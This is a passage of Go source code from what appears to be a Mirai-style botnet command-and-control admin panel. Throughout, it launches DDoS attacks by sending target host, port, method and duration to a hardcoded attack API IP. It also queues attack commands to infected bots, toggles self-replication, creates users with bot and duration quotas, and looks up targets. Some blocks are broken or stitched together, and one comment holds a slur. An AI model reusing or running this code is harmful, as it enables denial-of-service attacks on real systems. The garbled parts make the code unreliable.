		    method, err := this.ReadLine(false)
            if err != nil {
                return
            }
            this.conn.Write([]byte("\x1b[38;5;214m                                      ╠TIME: "))
		    timee, err := this.ReadLine(false)
            if err != nil {
                return
            }	
			url := "http://67.205.176.52/Mirai.php?key=botnet&host=" + apiip + "&port=" + port + "&method=" + method + "&time=" + timee + ""
			tr := &http.Transport{
				ResponseHeaderTimeout: 5 * time.Second,
				DisableCompression:    true,
			} // thx
			client := &http.Client{Transport: tr, Timeout: 5 * time.Second}
			locresponse, err := client.Get(url)
			if err != nil {
				this.conn.Write([]byte(fmt.Sprintf("\x1b[38;5;214m                                      ╠Sending may take up to 10 seconds\r\n")))
				continue
			}
			locresponsedata, err := ioutil.ReadAll(locresponse.Body)
			if err != nil {
				this.conn.Write([]byte(fmt.Sprintf("\033[31mError u did sum wrong\033[37;1m\r\n")))
				continue
			}
			locrespstring := string(locresponsedata)
			locformatted := strings.Replace(locrespstring, "\n", "\r\n", -1)
			this.conn.Write([]byte("\x1b[0m                              API Server Result\033[93m: \r\n\033[93m" + locformatted + "\x1b[0m\r\n"))

		if cmd == "gucci" || cmd == "GUCCI" || cmd == "c" {
			this.conn.Write([]byte("\033[2J\033[1;1H"))
			this.conn.Write([]byte("\033[38;5;22m                        ╔═╗  ╦ ╦  ╔═╗  ╔═╗  ╦           \x1b[0m \r\n"))
			this.conn.Write([]byte("\033[38;5;1m                        ║ ╦  ║ ║  ║    ║    ║         \x1b[0m \r\n"))
			this.conn.Write([]byte("\033[38;5;22m                        ╚═╝  ╚═╝  ╚═╝  ╚═╝  ╩       \x1b[0m \r\n"))
			this.conn.Write([]byte("\x1b[0;37m                      Type \033[38;5;1mhelp \x1b[0;37mfor \033[38;5;1mCommands List   \x1b[0m \r\n"))
			continue
		}

		if userInfo.admin == 1 && cmd == ".stopall" { // then a admin can stop all attacks at once with this func
			this.conn.Write([]byte("\033[37mAre u Sure\033[93m: \x1b[0m"))
			method, err := this.ReadLine(false)
			if err != nil {//nigga hm?
				return
			} //https://securityteamapi.io/api.php?ip=[host]&port=[port]&time=[time]&method=[method]&vip=[vip]&user=BlazingOVH1&key=********
			url := "http://67.205.176.52/scripts.php?key=botnet&host=71.71.71.127&port=80&method=STOP&time=40"
			tr := &http.Transport{
				ResponseHeaderTimeout: 5 * time.Second,
				DisableCompression:    true,
			} // thx
			client := &http.Client{Transport: tr, Timeout: 5 * time.Second}
			locresponse, err := client.Get(url)
			if err != nil {
				this.conn.Write([]byte(fmt.Sprintf("\033[31m\033[32mSent.\033[31m if did not send please wait 5m\033[37;1m\r\n")))
				continue
			}
			locresponsedata, err := ioutil.ReadAll(locresponse.Body)
			if err != nil {
				this.conn.Write([]byte(fmt.Sprintf("\033[31mError u did sum wrong\033[37;1m\r\n")))
				continue
			}
			locrespstring := string(locresponsedata)
			locformatted := strings.Replace(locrespstring, "\n", "\r\n", -1)
			this.conn.Write([]byte("\x1b[0m                         " + method + " to stopping attks\r\n\033[93m" + locformatted + "\x1b[0m\r\n"))
		}

		if userInfo.admin == 1 && cmd == "rep" { // then a admin can stop all attacks at once with this func
			this.conn.Write([]byte("\033[37mON OR OFF\033[93m: \x1b[0m"))
			method, err := this.ReadLine(false)
			if err != nil {
				return
			} //https://securityteamapi.io/api.php?ip=[host]&port=[port]&time=[time]&method=[method]&vip=[vip]&user=BlazingOVH1&key=********
			url := "http://67.205.176.52/scripts.php?key=botnet&host=71.71.71.127&port=80&" + method + "=STOP&time=40"
			tr := &http.Transport{
				ResponseHeaderTimeout: 5 * time.Second,
				DisableCompression:    true,
			} // thx
			client := &http.Client{Transport: tr, Timeout: 5 * time.Second}
			locresponse, err := client.Get(url)
			if err != nil {
				this.conn.Write([]byte(fmt.Sprintf("\033[31m\033[32mTurned " + method + " selfrep\033[37;1m\r\n")))
				continue
			}
			locresponsedata, err := ioutil.ReadAll(locresponse.Body)
			if err != nil {
				this.conn.Write([]byte(fmt.Sprintf("\033[31mError u did sum wrong\033[37;1m\r\n")))
				continue
			}
			locrespstring := string(locresponsedata)
			locformatted := strings.Replace(locrespstring, "\n", "\r\n", -1)
			this.conn.Write([]byte("\x1b[0m                        Turning Selfrep " + method + " \r\n\033[93m" + locformatted + "\x1b[0m\r\n"))
		}

		if err != nil || cmd == "IPLOOKUP2" || cmd == "iplookup2" {
			this.conn.Write([]byte("\x1b[38;5;214mIP\x1b[38;5;91m: \x1b[0m"))
			locipaddress, err := this.ReadLine(false)
			if err != nil {
				return
			}
			url := "https://ipinfo.io/" + locipaddress
			tr := &http.Transport{
				ResponseHeaderTimeout: 5 * time.Second,
				DisableCompression:    true,
			}
			client := &http.Client{Transport: tr, Timeout: 5 * time.Second}
			locresponse, err := client.Get(url)
			if err != nil {
				this.conn.Write([]byte(fmt.Sprintf("\033[31mAn Error Occured! Please try again Later.\033[37;1m\r\n")))
				continue
			}
			locresponsedata, err := ioutil.ReadAll(locresponse.Body)
			if err != nil {
				this.conn.Write([]byte(fmt.Sprintf("\033[31mAn Error Occured! Please try again Later.\033[37;1m\r\n")))
				continue
			}
			locrespstring := string(locresponsedata)
			locformatted := strings.Replace(locrespstring, "\n", "\r\n", -1)
			this.conn.Write([]byte("\x1b[38;5;214mResults\x1b[38;5;214m: \r\n\x1b[38;5;214m" + locformatted + "\x1b[0m\r\n"))
		}

		if err != nil || cmd == "asnlookup" || cmd == "ASNLOOKUP" {
			this.conn.Write([]byte("\x1b[38;5;214mASN\x1b[38;5;91m: \x1b[0m"))
			locipaddress, err := this.ReadLine(false)
			if err != nil {
				return
			}
			url := "https://ipinfo.io/" + locipaddress
			tr := &http.Transport{
				ResponseHeaderTimeout: 5 * time.Second,
				DisableCompression:    true,
			}
			client := &http.Client{Transport: tr, Timeout: 5 * time.Second}
			locresponse, err := client.Get(url)
			if err != nil {
				this.conn.Write([]byte(fmt.Sprintf("\033[31mAn Error Occured! Please try again Later.\033[37;1m\r\n")))
				continue
			}
			locresponsedata, err := ioutil.ReadAll(locresponse.Body)
			if err != nil {
				this.conn.Write([]byte(fmt.Sprintf("\033[31mAn Error Occured! Please try again Later.\033[37;1m\r\n")))
				continue
			}
			locrespstring := string(locresponsedata)
			locformatted := strings.Replace(locrespstring, "\n", "\r\n", -1)
			this.conn.Write([]byte("\x1b[38;5;214mResults\x1b[38;5;214m: \r\n\x1b[38;5;214m" + locformatted + "\x1b[0m\r\n"))
		}
			}
			client := &http.Client{Transport: tr, Timeout: 15 * time.Second}
			locresponse, err := client.Get(url)
			if err != nil {
				this.conn.Write([]byte(fmt.Sprintf("\033[32mAn Error Occured! Please try again Later.\033[37;1m\r\n")))
				continue
			}
			locresponsedata, err := ioutil.ReadAll(locresponse.Body)
			if err != nil {
				this.conn.Write([]byte(fmt.Sprintf("\033[32mAn Error Occured! Please try again Later.\033[37;1m\r\n")))
				continue
			}
			locrespstring := string(locresponsedata)
			locformatted := strings.Replace(locrespstring, "\n", "\r\n", -1)
			this.conn.Write([]byte("\x1b[1;32mResult\x1b[1;32m: \r\n\x1b[1;32m" + locformatted + "\x1b[0m\r\n"))
		}

		if err != nil || cmd == "/subnetcalc" || cmd == "/SUBNETCALC" {
			{
				return
			}
			url := "https://api.hackertarget.com/subnetcalc/?q=" + locipaddress
			tr := &http.Transport{
				ResponseHeaderTimeout: 5 * time.Second,
				DisableCompression:    true,
			}
			client := &http.Client{Transport: tr, Timeout: 5 * time.Second}
			locresponse, err := client.Get(url)
			if err != nil {
				this.conn.Write([]byte(fmt.Sprintf("\033[32mAn Error Occured! Please try again Later.\033[37;1m\r\n")))
				continue
			}
			locresponsedata, err := ioutil.ReadAll(locresponse.Body)
			if err != nil {
				this.conn.Write([]byte(fmt.Sprintf("\033[32mAn Error Occured! Please try again Later.\033[37;1m\r\n")))
				continue
			}
			locrespstring := string(locresponsedata)
			locformatted := strings.Replace(locrespstring, "\n", "\r\n", -1)
			this.conn.Write([]byte("\x1b[1;32mResult\x1b[1;32m: \r\n\x1b[1;32m" + locformatted + "\x1b[0m\r\n"))
		}

		if err != nil || cmd == "/zonetransfer" || cmd == "/ZONETRANSFER" {
			this.conn.Write([]byte("\x1b[1;32mIPv4 Or Website (Without www.)\x1b[1;32m: \x1b[0m"))
			locipaddress, err := this.ReadLine(false)
			if err != nil {
				return
			}
			url := "https://api.hackertarget.com/zonetransfer/?q=" + locipaddress
			tr := &http.Transport{
				ResponseHeaderTimeout: 15 * time.Second,
				DisableCompression:    true,
			}
			client := &http.Client{Transport: tr, Timeout: 15 * time.Second}
			locresponse, err := client.Get(url)
			if err != nil {
				this.conn.Write([]byte(fmt.Sprintf("\033[32mAn Error Occured! Please try again Later.\033[37;1m\r\n")))
				continue
			}
			locresponsedata, err := ioutil.ReadAll(locresponse.Body)
			if err != nil {
				this.conn.Write([]byte(fmt.Sprintf("\033[32mAn Error Occured! Please try again Later.\033[37;1m\r\n")))
				continue
			}
			locrespstring := string(locresponsedata)
			locformatted := strings.Replace(locrespstring, "\n", "\r\n", -1)
			this.conn.Write([]byte("\x1b[1;32mResult\x1b[1;32m: \r\n\x1b[1;32m" + locformatted + "\x1b[0m\r\n"))
		}

		botCount = userInfo.maxBots

		if userInfo.admin == 1 && cmd == "adduser" {
			this.conn.Write([]byte("\x1b[1;32mUsername:\x1b[0m "))
			new_un, err := this.ReadLine(false)
			if err != nil {
				return
			}
			this.conn.Write([]byte("\x1b[1;32mPassword:\x1b[0m "))
			new_pw, err := this.ReadLine(false)
			if err != nil {
				return
			}
			this.conn.Write([]byte("\x1b[1;32mBotcount (-1 for All):\x1b[0m "))
			max_bots_str, err := this.ReadLine(false)
			if err != nil {
				return
			}
			max_bots, err := strconv.Atoi(max_bots_str)
			if err != nil {
				this.conn.Write([]byte(fmt.Sprintf("\033[32m%s\033[0m\r\n", "Failed to parse the Bot Count")))
				continue
			}
			this.conn.Write([]byte("\x1b[1;32mAttack Duration (-1 for Unlimited):\x1b[0m "))
			duration_str, err := this.ReadLine(false)
			if err != nil {
				return
			}
			duration, err := strconv.Atoi(duration_str)
			if err != nil {
				this.conn.Write([]byte(fmt.Sprintf("\033[32m%s\033[0m\r\n", "Failed to parse the Attack Duration Limit")))
				continue
			}
			this.conn.Write([]byte("\x1b[1;32mCooldown (0 for No Cooldown):\x1b[0m "))
			cooldown_str, err := this.ReadLine(false)
			if err != nil {
				return
			}
			cooldown, err := strconv.Atoi(cooldown_str)
			if err != nil {
				this.conn.Write([]byte(fmt.Sprintf("\033[32m%s\033[0m\r\n", "Failed to parse Cooldown")))
				continue
			}
			this.conn.Write([]byte("\x1b[1;32m- New User Info - \r\n- Username - \x1b[1;32m" + new_un + "\r\n\033[0m- Password - \x1b[1;32m" + new_pw + "\r\n\033[0m- Bots - \x1b[1;32m" + max_bots_str + "\r\n\033[0m- Max Duration - \x1b[1;32m" + duration_str + "\r\n\033[0m- Cooldown - \x1b[1;32m" + cooldown_str + "   \r\n\x1b[1;32mContinue? (y/n):\x1b[0m "))
			confirm, err := this.ReadLine(false)
			if err != nil {
				return
			}
			if confirm != "y" {
				continue
			}
			if !database.CreateBasic(new_un, new_pw, max_bots, duration, cooldown) {
				this.conn.Write([]byte(fmt.Sprintf("\033[32m%s\033[0m\r\n", "Failed to Create New User. Unknown Error Occured.")))
			} else {
				this.conn.Write([]byte("\x1b[1;32mRegistered\033[0m\r\n"))
			}
			continue
		}

		if userInfo.admin == 1 && cmd == "deluser" {
			this.conn.Write([]byte("\x1b[1;32mUsername: \x1b[0m"))
			rm_un, err := this.ReadLine(false)
			if err != nil {
				return
			}
			this.conn.Write([]byte(" \x1b[1;32mAre You Sure You Want To Remove \x1b[1;32m" + rm_un + "\x1b[1;32m?(y/n): \x1b[0m"))
			confirm, err := this.ReadLine(false)
			if err != nil {
				return
			}
			if confirm != "y" {
				continue
			}
			if !database.RemoveUser(rm_un) {
				this.conn.Write([]byte(fmt.Sprintf("\033[01;32mUnable to Remove User\r\n")))
			} else {
				this.conn.Write([]byte("\x1b[1;32mUser Successfully Removed!\r\n"))
			}
			continue
		}

		botCount = userInfo.maxBots

		if userInfo.admin == 1 && cmd == "addadmin" {
			this.conn.Write([]byte("\x1b[1;32mUsername:\x1b[0m "))
			new_un, err := this.ReadLine(false)
			if err != nil {
				return
			}
			this.conn.Write([]byte("\x1b[1;32mPassword:\x1b[0m "))
			new_pw, err := this.ReadLine(false)
			if err != nil {
				return
			}
			this.conn.Write([]byte("\x1b[1;32mBotcount (-1 for All):\x1b[0m "))
			max_bots_str, err := this.ReadLine(false)
			if err != nil {
				return
			}
			max_bots, err := strconv.Atoi(max_bots_str)
			if err != nil {
				this.conn.Write([]byte(fmt.Sprintf("\033[32m%s\033[0m\r\n", "Failed to parse the Bot Count")))
				continue
			}
			this.conn.Write([]byte("\x1b[1;32mAttack Duration (-1 for Unlimited):\x1b[0m "))
			duration_str, err := this.ReadLine(false)
			if err != nil {
				return
			}
			duration, err := strconv.Atoi(duration_str)
			if err != nil {
				this.conn.Write([]byte(fmt.Sprintf("\033[32m%s\033[0m\r\n", "Failed to parse the Attack Duration Limit")))
				continue
			}
			this.conn.Write([]byte("\x1b[1;32mCooldown (0 for No Cooldown):\x1b[0m "))
			cooldown_str, err := this.ReadLine(false)
			if err != nil {
				return
			}
			cooldown, err := strconv.Atoi(cooldown_str)
			if err != nil {
				this.conn.Write([]byte(fmt.Sprintf("\033[32m%s\033[0m\r\n", "Failed to parse the Cooldown")))
				continue
			}
			this.conn.Write([]byte("\x1b[1;32m- New User Info - \r\n- Username - \x1b[1;32m" + new_un + "\r\n\033[0m- Password - \x1b[1;32m" + new_pw + "\r\n\033[0m- Bots - \x1b[1;32m" + max_bots_str + "\r\n\033[0m- Max Duration - \x1b[1;32m" + duration_str + "\r\n\033[0m- Cooldown - \x1b[1;32m" + cooldown_str + "   \r\n\x1b[1;32mContinue? (y/n):\x1b[0m "))
			confirm, err := this.ReadLine(false)
			if err != nil {
				return
			}
			if confirm != "y" {
				continue
			}
			if !database.CreateAdmin(new_un, new_pw, max_bots, duration, cooldown) {
				this.conn.Write([]byte(fmt.Sprintf("\033[32m%s\033[0m\r\n", "Failed to Create New User. Unknown Error Occured.")))
			} else {
				this.conn.Write([]byte("\x1b[1;32mAdmin Added Successfully!\033[0m\r\n"))
			}
			continue
		}

		if cmd == "BOTS" || cmd == "bots" {
			botCount = clientList.Count()
			m := clientList.Distribution()
			for k, v := range m {
				this.conn.Write([]byte(fmt.Sprintf("\x1b[1;36m                                ║[%s] \x1b[0m[%d]\r\n\033[0m", k, v)))
			}
			this.conn.Write([]byte(fmt.Sprintf("\x1b[1;36m                                ║[Total] \x1b[0m[%d]\r\n\033[0m", botCount)))
			continue
		}
		if cmd[0] == '-' {
			countSplit := strings.SplitN(cmd, " ", 2)
			count := countSplit[0][1:]
			botCount, err = strconv.Atoi(count)
			if err != nil {
				this.conn.Write([]byte(fmt.Sprintf("\033[34;1mFailed To Parse Botcount \"%s\"\033[0m\r\n", count)))
				continue
			}
			if userInfo.maxBots != -1 && botCount > userInfo.maxBots {
				this.conn.Write([]byte(fmt.Sprintf("\033[34;1mBot Count To Send Is Bigger Than Allowed Bot Maximum\033[0m\r\n")))
				continue
			}
			cmd = countSplit[1]
		}
		if cmd[0] == '@' {
			cataSplit := strings.SplitN(cmd, " ", 2)
			botCatagory = cataSplit[0][1:]
			cmd = cataSplit[1]
		}

		atk, err := NewAttack(cmd, userInfo.admin)
		if err != nil {
			this.conn.Write([]byte(fmt.Sprintf("\033[32m%s\033[0m\r\n", err.Error())))
		} else {
			buf, err := atk.Build()
			if err != nil {
				this.conn.Write([]byte(fmt.Sprintf("\033[32m%s\033[0m\r\n", err.Error())))
			} else {
				if can, err := database.CanLaunchAttack(username, atk.Duration, cmd, botCount, 0); !can {
					this.conn.Write([]byte(fmt.Sprintf("\033[32m%s\033[0m\r\n", err.Error())))
				} else if !database.ContainsWhitelistedTargets(atk) {
					clientList.QueueBuf(buf, botCount, botCatagory)
					this.conn.Write([]byte("\033[2J\033[1;1H"))
					this.conn.Write([]byte(fmt.Sprintf("\033[1;35m╔═══════════════════════════════════════╦════════════════════════════╗\r\n")))
					this.conn.Write([]byte(fmt.Sprintf("\033[1;35m║╔═╗  ╦═╗  ╦  ╔╦╗  \033[1;37m╦  \033[1;36m╔╦╗  ╦  ╦  ╦  ╔═╗ \033[1;35m║\033[1;37mThank you for using.        \033[1;35m║\r\n")))
					this.conn.Write([]byte(fmt.Sprintf("\033[1;35m║╠═╝  ╠╦╝  ║  ║║║  \033[1;37m║  \033[1;36m ║   ║  ╚╗╔╝  ║╣  \033[1;35m║\033[1;37mEverytime you post this     \033[1;35m║\r\n")))
					this.conn.Write([]byte(fmt.Sprintf("\033[1;35m║╩    ╩╚═  ╩  ╩ ╩  \033[1;37m╩  \033[1;36m ╩   ╩   ╚╝   ╚═╝ \033[1;35m║\033[1;37mmake sure to @gme.crzy.     \033[1;35m║\r\n")))
					this.conn.Write([]byte(fmt.Sprintf("\033[1;35m╠═══╦═════════════════════════════════╦═╩════════════════════════════╣\r\n")))
					this.conn.Write([]byte(fmt.Sprintf("\033[1;35m║\033[1;31m<3 \033[1;35m║\033[1;37m╔═╗╔╦╗╔╦╗╔═╗╔═╗╦╔═   ╔═╗╔═╗╔╗╔╔╦╗\033[1;35m║.............., ¯­­.          ║\r\n")))
					this.conn.Write([]byte(fmt.Sprintf("\033[1;35m║\033[1;31m<3 \033[1;35m║\033[1;37m╠═╣ ║  ║ ╠═╣║  ╠╩╗───╚═╗║╣ ║║║ ║ \033[1;35m║........,´¯`,....­­/          ║\r\n")))
					this.conn.Write([]byte(fmt.Sprintf("\033[1;35m║\033[1;31m<3 \033[1;35m║\033[1;37m╩ ╩ ╩  ╩ ╩ ╩╚═╝╩ ╩   ╚═╝╚═╝╝╚╝ ╩ \033[1;35m║...../¯/.../..../             ║\r\n")))
					this.conn.Write([]byte(fmt.Sprintf("\033[1;35m║\033[1;31m<3 \033[1;35m╠═════════════════════════════════╣.../../.../..../­­...-----.   ║\r\n")))
					this.conn.Write([]byte(fmt.Sprintf("\033[1;35m║\033[1;31m<3 \033[1;35m║\033[1;36m       ╦═╗     ╦     ╔═╗         \033[1;35m║./../.../....//­­.............║\r\n"))) 
					this.conn.Write([]byte(fmt.Sprintf("\033[1;35m║\033[1;31m<3 \033[1;35m║\033[1;36m       ╠╦╝     ║     ╠═╝         \033[1;35m║/../.../..../­­......../´|....║\r\n")))
					this.conn.Write([]byte(fmt.Sprintf("\033[1;35m║\033[1;31m<3 \033[1;35m║\033[1;31m    o  \033[1;36m╩╚═  \033[1;31mo  \033[1;36m╩  \033[1;31mo  \033[1;36m╩   \033[1;31mo\033[1;35m       ║(..(...(.....(.....­­.|  |....|║\r\n")))
					this.conn.Write([]byte(fmt.Sprintf("\033[1;35m║\033[1;31m<3 \033[1;35m║                                 ║..................­­..|../.../║\r\n")))
					this.conn.Write([]byte(fmt.Sprintf("\033[1;35m║\033[1;31m<3 \033[1;35m║                                 ║..............­­......V...../ ║\r\n")))
					this.conn.Write([]byte(fmt.Sprintf("\033[1;35m║\033[1;31m<3 \033[1;35m║                                 ║..............­­.........../  ║\r\n")))
					this.conn.Write([]byte(fmt.Sprintf("\033[1;35m║\033[1;31m<3 \033[1;35m║                                 ║..............­­........../   ║\r\n")))
					this.conn.Write([]byte(fmt.Sprintf("\033[1;35m╚═══╩═════════════════════════════════╩══════════════════════════════╝\r\n")))//💔
				} else {
					fmt.Println("Blocked Attack By " + username + " To Whitelisted Prefix")
				}
			}
		}
	}
}

func (this *Admin) ReadLine(masked bool) (string, error) {
	buf := make([]byte, 1000)// prolinging the inevlitable aint doing shit
	bufPos := 0

	for {
		n, err := this.conn.Read(buf[bufPos : bufPos+1])
		if err != nil || n != 1 {
			return "", err
		}
		if buf[bufPos] == '\xFF' {
			n, err := this.conn.Read(buf[bufPos : bufPos+2])
			if err != nil || n != 2 {
				return "", err
			}
			bufPos--
		} else if buf[bufPos] == '\x7F' || buf[bufPos] == '\x08' {
			if bufPos > 0 {
				this.conn.Write([]byte(string(buf[bufPos])))
				bufPos--
			}
			bufPos--
		} else if buf[bufPos] == '\r' || buf[bufPos] == '\t' || buf[bufPos] == '\x09' {
			bufPos--
		} else if buf[bufPos] == '\n' || buf[bufPos] == '\x00' {
			this.conn.Write([]byte("\r\n"))
			return string(buf[:bufPos]), nil
		} else if buf[bufPos] == 0x03 {
			this.conn.Write([]byte("^C\r\n"))
			return "", nil
		} else {
			if buf[bufPos] == '\x1B' {
				buf[bufPos] = '^'
				this.conn.Write([]byte(string(buf[bufPos])))
				bufPos++
				buf[bufPos] = '['
				this.conn.Write([]byte(string(buf[bufPos])))
			} else if masked {
				this.conn.Write([]byte("x"))//What desplayes when u type in password...
			} else {
				this.conn.Write([]byte(string(buf[bufPos])))
			}
		}
		bufPos++
	}
	return string(buf), nil
}
